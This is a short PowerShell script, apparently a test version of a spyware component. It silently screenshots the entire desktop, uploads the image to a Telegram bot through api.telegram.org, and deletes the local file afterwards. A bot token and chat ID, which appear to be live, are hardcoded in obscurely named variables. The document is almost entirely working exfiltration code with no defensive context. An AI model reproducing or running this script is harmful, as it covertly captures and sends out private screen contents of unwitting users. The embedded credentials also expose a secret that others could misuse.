# TEST THIS SIMPLE VERSION FIRST
$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
$y = "2146236602"

# Take screenshot
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap=New-Object Drawing.Bitmap $screen.Width,$screen.Height
$graphics=[Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size)
$path="$env:TEMP\test_ss.png"
$bitmap.Save($path)
$graphics.Dispose();$bitmap.Dispose()

# Send using curl (most reliable)
curl -s -X POST "https://api.telegram.org/bot$x/sendPhoto" `
  -F "chat_id=$y" `
  -F "caption=Test screenshot from PowerShell" `
  -F "photo=@$path"

# Cleanup
Remove-Item $path
